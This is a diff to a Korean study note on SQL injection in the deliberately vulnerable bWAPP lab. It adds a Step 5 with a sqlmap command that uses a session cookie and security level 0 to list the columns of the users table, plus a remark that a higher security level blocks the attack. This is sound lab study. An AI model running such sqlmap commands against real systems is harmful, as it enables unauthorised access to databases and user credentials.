@@ -160,6 +160,8 @@ SQL 인젝션 후 웹 브라우저에서 데이터베이스에 저장된 users �
 </b></summary>
 <br>   
 
+전체적인 로직은 위와 같음.
+
 **Step 1. 사용법**
 `sqlmap -u [SQL Injection 취약점이 존재하는 페이지의 주소] --cookie = [인증을 전제하는 경우에 SESSIONID가 포함된 쿠키값]`
 
@@ -206,5 +208,17 @@ security_level = 0
 
 ![sqlmap4](https://user-images.githubusercontent.com/76420201/106386066-89ddba80-6416-11eb-9234-989108405092.gif)
 
+---
+
+**Step 5. Users 테이블 칼럼 정보 조회**
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo sqlmap -u "http://bee-box/bWAPP/sqli_1.php?title=man&action=search" \
+--cookie="PHPSESSID=fc13d1925d717ec8ff2ec1f6e6182f34; security_level=0" -D bWAPP -T users --columns
+```
+
+![sqlmap5](https://user-images.githubusercontent.com/76420201/106386243-6c5d2080-6417-11eb-9130-6bc277387ddc.gif)
+
 </details>
 
+Security Level을 올리게 되면 SQL Injection 공격이 통하지 않음
